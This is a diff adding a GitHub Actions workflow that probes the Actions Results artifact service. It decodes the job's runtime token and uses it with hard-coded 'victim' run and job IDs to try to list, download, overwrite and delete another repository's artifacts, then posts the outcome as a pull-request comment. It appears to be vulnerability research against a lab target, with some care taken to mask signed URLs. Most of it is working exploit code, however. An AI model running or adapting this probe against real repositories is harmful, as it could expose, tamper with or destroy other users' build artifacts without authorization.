@@ -1,0 +1,411 @@
+name: GHBB public Results service boundary probe
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  issues: write
+  pull-requests: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    env:
+      VICTIM_RUN_BACKEND_ID: e40710a1-021c-4829-b2f1-3525b7493c1c
+      VICTIM_JOB_BACKEND_ID: 30ad3e4e-048d-50ff-b6c3-a4bf3c7a3315
+      VICTIM_ARTIFACT_NAME: ghbb-results-service-victim-context-20260726
+      VICTIM_ARTIFACT_DATABASE_ID: '8636216844'
+      VICTIM_REPOSITORY_MARKER: jackson-kuja/ghbb-cache-lab-20260726-7c4f
+    steps:
+      - name: Build harmless attacker artifact ZIP
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p attacker-artifact
+          printf 'GHBB-RESULTS-ATTACKER-%s\nrepository=%s\n' "$GITHUB_RUN_ID" "$GITHUB_REPOSITORY" > attacker-artifact/context.txt
+          zip -q -r attacker-artifact.zip attacker-artifact
+          sha256sum attacker-artifact.zip
+
+      - name: Exercise Results artifact protocol and authorization matrix
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs')
+            const path = require('path')
+            const crypto = require('crypto')
+            const {spawnSync} = require('child_process')
+
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
+            const victimRun = process.env.VICTIM_RUN_BACKEND_ID
+            const victimJob = process.env.VICTIM_JOB_BACKEND_ID
+            const victimName = process.env.VICTIM_ARTIFACT_NAME
+            const victimDatabaseId = process.env.VICTIM_ARTIFACT_DATABASE_ID
+            const victimRepositoryMarker = process.env.VICTIM_REPOSITORY_MARKER
+            const attackerZip = fs.readFileSync('attacker-artifact.zip')
+            const attackerDigest = crypto.createHash('sha256').update(attackerZip).digest('hex')
+            const attackerMarker = `GHBB-RESULTS-ATTACKER-${context.runId}`
+            const ownName = `ghbb-results-own-${context.runId}`
+            const foreignCreateName = `ghbb-results-foreign-create-${context.runId}`
+            const bogusCreateName = `ghbb-results-bogus-create-${context.runId}`
+
+            const state = {
+              runtime_context_valid: false,
+              positive_create_valid: false,
+              positive_upload_valid: false,
+              positive_finalize_valid: false,
+              positive_list_valid: false,
+              positive_download_valid: false,
+              positive_delete_valid: false,
+              backend_id_behavior: '<undetermined>',
+              foreign_create_landed_current: false,
+              foreign_create_landed_victim_candidate: false,
+              bogus_create_landed_current: false,
+              authorization_boundary_failure: false,
+              harness_valid: false,
+              failure: '<none>'
+            }
+            const cases = []
+
+            function runtimeIds() {
+              if (!token || !resultsUrl) throw new Error('runtime_context')
+              const parts = token.split('.')
+              if (parts.length < 3) throw new Error('runtime_jwt')
+              const payload = parts[1] + '='.repeat((4 - parts[1].length % 4) % 4)
+              const claims = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'))
+              const match = /(?:^| )Actions\.Results:([^: ]+):([^ ]+)/.exec(claims.scp || '')
+              if (!match) throw new Error('results_scope')
+              return {run: match[1], job: match[2]}
+            }
+
+            const own = runtimeIds()
+            state.runtime_context_valid = true
+            const base = resultsUrl.endsWith('/') ? resultsUrl : `${resultsUrl}/`
+            const service = `${base}twirp/github.actions.results.api.v1.ArtifactService`
+
+            async function twirp(method, body) {
+              try {
+                const response = await fetch(`${service}/${method}`, {
+                  method: 'POST',
+                  headers: {
+                    authorization: `Bearer ${token}`,
+                    'content-type': 'application/json'
+                  },
+                  body: JSON.stringify(body),
+                  signal: AbortSignal.timeout(20000)
+                })
+                const text = await response.text()
+                let json = null
+                try { json = text ? JSON.parse(text) : {} } catch (_) {}
+                return {status: response.status, json}
+              } catch (_) {
+                return {status: 0, json: null}
+              }
+            }
+
+            async function transfer(url, method, bytes = undefined) {
+              if (!url) return {status: 0, bytes: Buffer.alloc(0)}
+              core.setSecret(url)
+              try {
+                const options = {method, signal: AbortSignal.timeout(20000)}
+                if (method === 'PUT') {
+                  options.headers = {
+                    'x-ms-blob-type': 'BlockBlob',
+                    'x-ms-version': '2021-12-02',
+                    'content-type': 'application/zip'
+                  }
+                  options.body = bytes
+                }
+                const response = await fetch(url, options)
+                const returned = method === 'GET' && response.status === 200
+                  ? Buffer.from(await response.arrayBuffer())
+                  : Buffer.alloc(0)
+                return {status: response.status, bytes: returned}
+              } catch (_) {
+                return {status: 0, bytes: Buffer.alloc(0)}
+              }
+            }
+
+            function inspectZip(label, bytes, expectedNeedles) {
+              const result = {zip_valid: false, extract_exit: -1, exact_marker: false}
+              if (!bytes.length) return result
+              const safe = label.replace(/[^a-zA-Z0-9_.-]/g, '_')
+              const archive = `${safe}.zip`
+              const directory = `${safe}-extract`
+              fs.writeFileSync(archive, bytes, {mode: 0o600})
+              fs.rmSync(directory, {recursive: true, force: true})
+              fs.mkdirSync(directory, {recursive: true, mode: 0o700})
+              const extracted = spawnSync('unzip', ['-q', archive, '-d', directory], {
+                timeout: 20000,
+                encoding: 'utf8'
+              })
+              result.extract_exit = extracted.status === null ? -1 : extracted.status
+              result.zip_valid = extracted.status === 0
+              if (!result.zip_valid) return result
+              const pending = [directory]
+              let files = 0
+              while (pending.length && files < 1000) {
+                const current = pending.pop()
+                let entries = []
+                try { entries = fs.readdirSync(current, {withFileTypes: true}) } catch (_) { continue }
+                for (const entry of entries) {
+                  const full = path.join(current, entry.name)
+                  if (entry.isDirectory()) pending.push(full)
+                  else if (entry.isFile()) {
+                    files += 1
+                    try {
+                      if (fs.statSync(full).size > 1024 * 1024) continue
+                      const text = fs.readFileSync(full, 'utf8')
+                      if (expectedNeedles.every(needle => text.includes(needle))) {
+                        result.exact_marker = true
+                        return result
+                      }
+                    } catch (_) {}
+                  }
+                }
+              }
+              return result
+            }
+
+            function artifactNames(response) {
+              const artifacts = Array.isArray(response?.artifacts) ? response.artifacts : []
+              return artifacts.map(item => item.name).filter(Boolean)
+            }
+
+            async function listCase({name, run, job, nameFilter, idFilter, expectedName}) {
+              const body = {
+                workflow_run_backend_id: run,
+                workflow_job_run_backend_id: job
+              }
+              if (nameFilter !== undefined) body.name_filter = nameFilter
+              if (idFilter !== undefined) body.id_filter = String(idFilter)
+              const response = await twirp('ListArtifacts', body)
+              const names = artifactNames(response.json)
+              const record = {
+                kind: 'list', name, http: response.status,
+                count: names.length,
+                expected_name_present: expectedName ? names.includes(expectedName) : false,
+                names: names.slice(0, 5)
+              }
+              cases.push(record)
+              return {record, response}
+            }
+
+            async function downloadCase({name, run, job, artifactName, expectedNeedles}) {
+              const response = await twirp('GetSignedArtifactURL', {
+                workflow_run_backend_id: run,
+                workflow_job_run_backend_id: job,
+                name: artifactName
+              })
+              const url = response.json?.signed_url || response.json?.signedUrl || ''
+              const downloaded = await transfer(url, 'GET')
+              const inspected = inspectZip(name, downloaded.bytes, expectedNeedles)
+              const record = {
+                kind: 'download', name, http: response.status,
+                signed_url: Boolean(url), download_http: downloaded.status,
+                bytes: downloaded.bytes.length,
+                sha256: downloaded.bytes.length
+                  ? crypto.createHash('sha256').update(downloaded.bytes).digest('hex')
+                  : '<none>',
+                zip_valid: inspected.zip_valid,
+                extract_exit: inspected.extract_exit,
+                exact_marker: inspected.exact_marker
+              }
+              cases.push(record)
+              return record
+            }
+
+            async function createAndFinalize({label, run, job, artifactName}) {
+              const created = await twirp('CreateArtifact', {
+                workflow_run_backend_id: run,
+                workflow_job_run_backend_id: job,
+                name: artifactName,
+                version: 7,
+                mime_type: 'application/zip'
+              })
+              const uploadUrl = created.json?.signed_upload_url || created.json?.signedUploadUrl || ''
+              const uploaded = await transfer(uploadUrl, 'PUT', attackerZip)
+              const finalized = await twirp('FinalizeArtifact', {
+                workflow_run_backend_id: run,
+                workflow_job_run_backend_id: job,
+                name: artifactName,
+                size: String(attackerZip.length),
+                hash: `sha256:${attackerDigest}`
+              })
+              const record = {
+                kind: 'write', name: label,
+                create_http: created.status,
+                create_ok: created.json?.ok === true,
+                signed_upload_url: Boolean(uploadUrl),
+                upload_http: uploaded.status,
+                finalize_http: finalized.status,
+                finalize_ok: finalized.json?.ok === true,
+                artifact_id: finalized.json?.artifact_id || finalized.json?.artifactId || '<none>'
+              }
+              cases.push(record)
+              return record
+            }
+
+            try {
+              const positiveWrite = await createAndFinalize({
+                label: 'positive_write', run: own.run, job: own.job, artifactName: ownName
+              })
+              state.positive_create_valid = positiveWrite.create_http === 200 && positiveWrite.create_ok && positiveWrite.signed_upload_url
+              state.positive_upload_valid = positiveWrite.upload_http >= 200 && positiveWrite.upload_http < 300
+              state.positive_finalize_valid = positiveWrite.finalize_http === 200 && positiveWrite.finalize_ok && positiveWrite.artifact_id !== '<none>'
+
+              const positiveList = await listCase({
+                name: 'positive_list', run: own.run, job: own.job,
+                nameFilter: ownName, expectedName: ownName
+              })
+              state.positive_list_valid = positiveList.record.http === 200 && positiveList.record.expected_name_present
+
+              const positiveDownload = await downloadCase({
+                name: 'positive_download', run: own.run, job: own.job,
+                artifactName: ownName, expectedNeedles: [attackerMarker, 'jackson-kuja/Council']
+              })
+              state.positive_download_valid = positiveDownload.http === 200 && positiveDownload.signed_url &&
+                positiveDownload.download_http === 200 && positiveDownload.zip_valid && positiveDownload.exact_marker
+
+              const ownViaVictimIds = await listCase({
+                name: 'own_name_victim_ids', run: victimRun, job: victimJob,
+                nameFilter: ownName, expectedName: ownName
+              })
+              const ownViaBogusIds = await listCase({
+                name: 'own_name_bogus_ids', run: '00000000-0000-0000-0000-000000000001',
+                job: '00000000-0000-0000-0000-000000000002', nameFilter: ownName, expectedName: ownName
+              })
+              const ownViaMixedIds = await listCase({
+                name: 'own_name_mixed_ids', run: victimRun, job: own.job,
+                nameFilter: ownName, expectedName: ownName
+              })
+              if (ownViaVictimIds.record.expected_name_present && ownViaBogusIds.record.expected_name_present && ownViaMixedIds.record.expected_name_present) {
+                state.backend_id_behavior = 'ignored_token_derived'
+              } else if (!ownViaVictimIds.record.expected_name_present && !ownViaBogusIds.record.expected_name_present && !ownViaMixedIds.record.expected_name_present) {
+                state.backend_id_behavior = 'honored_or_rejected'
+              } else {
+                state.backend_id_behavior = 'mixed'
+              }
+
+              const foreignList = await listCase({
+                name: 'victim_name_victim_ids', run: victimRun, job: victimJob,
+                nameFilter: victimName, expectedName: victimName
+              })
+              const foreignByGlobalIdOwn = await listCase({
+                name: 'victim_global_id_own_ids', run: own.run, job: own.job,
+                idFilter: victimDatabaseId, expectedName: victimName
+              })
+              const foreignByGlobalIdVictim = await listCase({
+                name: 'victim_global_id_victim_ids', run: victimRun, job: victimJob,
+                idFilter: victimDatabaseId, expectedName: victimName
+              })
+
+              const foreignDownload = await downloadCase({
+                name: 'victim_download_victim_ids', run: victimRun, job: victimJob,
+                artifactName: victimName,
+                expectedNeedles: [victimRepositoryMarker, victimRun, victimJob]
+              })
+              const foreignDownloadOwn = await downloadCase({
+                name: 'victim_download_own_ids', run: own.run, job: own.job,
+                artifactName: victimName,
+                expectedNeedles: [victimRepositoryMarker, victimRun, victimJob]
+              })
+
+              if (foreignList.record.expected_name_present || foreignByGlobalIdOwn.record.expected_name_present ||
+                  foreignByGlobalIdVictim.record.expected_name_present || foreignDownload.exact_marker || foreignDownloadOwn.exact_marker) {
+                state.authorization_boundary_failure = true
+              }
+
+              const foreignCreate = await createAndFinalize({
+                label: 'foreign_ids_write', run: victimRun, job: victimJob,
+                artifactName: foreignCreateName
+              })
+              const foreignCreateOwnList = await listCase({
+                name: 'foreign_create_own_ids_list', run: own.run, job: own.job,
+                nameFilter: foreignCreateName, expectedName: foreignCreateName
+              })
+              const foreignCreateVictimList = await listCase({
+                name: 'foreign_create_victim_ids_list', run: victimRun, job: victimJob,
+                nameFilter: foreignCreateName, expectedName: foreignCreateName
+              })
+              state.foreign_create_landed_current = foreignCreateOwnList.record.expected_name_present
+              state.foreign_create_landed_victim_candidate = foreignCreateVictimList.record.expected_name_present && !foreignCreateOwnList.record.expected_name_present
+              if (state.foreign_create_landed_victim_candidate) state.authorization_boundary_failure = true
+
+              const bogusCreate = await createAndFinalize({
+                label: 'bogus_ids_write',
+                run: '00000000-0000-0000-0000-000000000001',
+                job: '00000000-0000-0000-0000-000000000002',
+                artifactName: bogusCreateName
+              })
+              const bogusCreateOwnList = await listCase({
+                name: 'bogus_create_own_ids_list', run: own.run, job: own.job,
+                nameFilter: bogusCreateName, expectedName: bogusCreateName
+              })
+              state.bogus_create_landed_current = bogusCreateOwnList.record.expected_name_present
+
+              const foreignDelete = await twirp('DeleteArtifact', {
+                workflow_run_backend_id: victimRun,
+                workflow_job_run_backend_id: victimJob,
+                name: victimName
+              })
+              cases.push({
+                kind: 'delete', name: 'victim_delete_victim_ids',
+                http: foreignDelete.status,
+                ok: foreignDelete.json?.ok === true,
+                artifact_id: foreignDelete.json?.artifact_id || foreignDelete.json?.artifactId || '<none>'
+              })
+              if (foreignDelete.status === 200 && foreignDelete.json?.ok === true) state.authorization_boundary_failure = true
+
+              const ownDelete = await twirp('DeleteArtifact', {
+                workflow_run_backend_id: own.run,
+                workflow_job_run_backend_id: own.job,
+                name: ownName
+              })
+              state.positive_delete_valid = ownDelete.status === 200 && ownDelete.json?.ok === true
+              cases.push({
+                kind: 'delete', name: 'positive_delete',
+                http: ownDelete.status,
+                ok: ownDelete.json?.ok === true,
+                artifact_id: ownDelete.json?.artifact_id || ownDelete.json?.artifactId || '<none>'
+              })
+
+              state.harness_valid = state.runtime_context_valid && state.positive_create_valid &&
+                state.positive_upload_valid && state.positive_finalize_valid && state.positive_list_valid &&
+                state.positive_download_valid && state.positive_delete_valid
+            } catch (error) {
+              state.failure = String(error?.message || 'other').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 80)
+            }
+
+            for (const [name, value] of Object.entries(state)) console.log(`${name}=${value}`)
+            for (const item of cases) console.log(`${item.name}=${JSON.stringify(item)}`)
+
+            const compact = cases.map(item => {
+              const parts = Object.entries(item).filter(([key]) => key !== 'name' && key !== 'kind')
+                .map(([key, value]) => `${key}=${Array.isArray(value) ? value.join(',') : value}`)
+              return `- ${item.name}: \`${parts.join(', ')}\``
+            })
+            const body = [
+              '<!-- ghbb-public-results-service-result -->',
+              `GHBB public Results-service boundary result for run ${context.runId}:`,
+              ...Object.entries(state).map(([name, value]) => `- ${name}: \`${value}\``),
+              ...compact,
+              '- runtime_token_signed_url_or_artifact_content_exposed: `false`'
+            ].join('\n')
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.payload.pull_request.number,
+              body
+            })
+
+            if (!state.harness_valid) {
+              core.setFailed(`Results-service harness invalid: ${state.failure}`)
+            } else if (state.authorization_boundary_failure) {
+              core.setFailed('CONFIRMED_RESULTS_SERVICE_CROSS_REPOSITORY_AUTHORIZATION_FAILURE')
+            } else {
+              console.log(`RESULT=RESULTS_SERVICE_${state.backend_id_behavior}`)
+            }
